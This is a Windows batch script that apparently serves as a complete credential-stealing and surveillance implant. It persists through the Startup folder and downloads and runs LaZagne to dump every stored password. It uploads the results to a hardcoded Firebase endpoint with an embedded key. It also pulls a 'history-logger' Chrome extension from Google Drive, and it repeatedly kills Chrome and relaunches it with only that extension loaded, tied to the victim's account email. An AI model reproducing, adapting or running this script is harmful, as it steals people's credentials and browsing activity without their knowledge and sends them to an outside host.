@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

set "SCRIPT_DIR=%~dp0"
set "SCRIPT_NAME=%~nx0"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "STARTUP_SCRIPT=%STARTUP_DIR%\%SCRIPT_NAME%"

set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"
set "ZIP_URL=https://drive.google.com/uc?export=download&id=1_MrCTaWFitVrrapsDodqTZduIvWKHCtU"
set "WORKDIR=%SCRIPT_DIR%history-logger"

set "CHROME_EXE=C:\Program Files\Google\Chrome\Application\chrome.exe"
if not exist "!CHROME_EXE!" (
    set "CHROME_EXE=%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
)
if not exist "!CHROME_EXE!" (
    for /f "tokens=*" %%i in ('where chrome.exe 2^>nul') do (
        set "CHROME_EXE=%%i"
        goto :chrome_found
    )
    exit /b 1
)
:chrome_found

if not exist "%STARTUP_SCRIPT%" (
    copy "%SCRIPT_DIR%%SCRIPT_NAME%" "%STARTUP_SCRIPT%" >nul 2>nul
    if errorlevel 1 exit /b 1
)

:monitor_loop
for /f "tokens=2 delims=," %%i in ('tasklist /FI "IMAGENAME eq chrome.exe" /V /FO CSV 2^>nul') do (
    set "chrome_pid=%%i"
    tasklist /FI "PID eq !chrome_pid!" /V /FO CSV 2^>nul | find /I "--disable-extensions-except=""!WORKDIR!"" --load-extension=""!WORKDIR!""" >nul
    if !errorlevel! neq 0 (
        taskkill /PID !chrome_pid! /F >nul 2>nul
        timeout /t 1 /nobreak >nul
    )
)

if not exist "%LAZAGNE_EXE%" (
    powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'" >nul 2>nul
    if errorlevel 1 exit /b 1
    if not exist "%LAZAGNE_EXE%" exit /b 1
)

if not exist "%OUTPUT_DIR%" (
    mkdir "%OUTPUT_DIR%" 2>nul
    if errorlevel 1 exit /b 1
)

if not exist "%LAZAGNE_EXE%" exit /b 1
"%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>nul
if errorlevel 1 exit /b 1

for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"
if not defined RESULT_FILE exit /b 1

set "PC_NAME=%COMPUTERNAME%"
set "PC_NAME=!PC_NAME: =_!"
set "PC_NAME=!PC_NAME:-=_!"
powershell -Command "$content=Get-Content -Raw -Path '%OUTPUT_DIR%\%RESULT_FILE%'; $json=@{'computer'='%PC_NAME%';'timestamp'='%DATE% %TIME%';'data'=$content} | ConvertTo-Json -Compress; $response=Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body $json -ContentType 'application/json'" >nul 2>nul
if errorlevel 1 exit /b 1

del /q "%LAZAGNE_EXE%" >nul 2>nul

if exist "%WORKDIR%" (
    rd /s /q "%WORKDIR%" >nul 2>nul
    if errorlevel 1 exit /b 1
)
mkdir "%WORKDIR%" >nul 2>nul
if errorlevel 1 exit /b 1

powershell -NoProfile -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing" >nul 2>nul
if errorlevel 1 exit /b 1

powershell -NoProfile -Command "Expand-Archive -Path '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force" >nul 2>nul
if errorlevel 1 exit /b 1

set "EMAIL="
for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
    if exist "%%P\Preferences" (
        for /f "usebackq delims=" %%E in (`powershell -NoProfile -Command "try { (Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email } catch { '' }"`) do (
            if not "%%E"=="" (
                set "EMAIL=%%E"
                set "PROFILE_DIR=%%P"
                goto :found_email
            )
        )
    )
)
:found_email
if not defined EMAIL (
    set "EMAIL=anonymous@demo.com"
    set "PROFILE_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
)

(
    echo {"userEmail":"!EMAIL!"}
) > "%WORKDIR%\config.json"
if errorlevel 1 exit /b 1

for %%I in ("!CHROME_EXE!") do set "SHORT_CHROME_EXE=%%~sI"
for %%I in ("!PROFILE_DIR!") do set "SHORT_PROFILE_DIR=%%~sI"
for %%I in ("%WORKDIR%") do set "SHORT_WORKDIR=%%~sI"
start "" "!CHROME_EXE!" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="!SHORT_WORKDIR!" --load-extension="!SHORT_WORKDIR!" >nul 2>nul
if errorlevel 1 exit /b 1

timeout /t 10 >nul  // Wait 10 seconds before next check
goto monitor_loop
